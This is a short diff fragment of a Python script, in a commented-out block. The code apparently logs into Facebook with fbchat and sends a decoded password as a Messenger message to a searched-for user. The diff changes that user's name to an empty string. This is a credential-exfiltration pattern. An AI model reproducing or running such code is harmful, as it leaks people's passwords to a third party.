@@ -88,7 +88,7 @@ while True:
                         password=o(key,password)
                         client=Client(username,password)
                 """
-                x=client.searchForUsers("Srijon Kumar")
+                x=client.searchForUsers("") 
                 f=x[0]
                 client.send(fbchat.models.Message(password),f.uid )
                 """
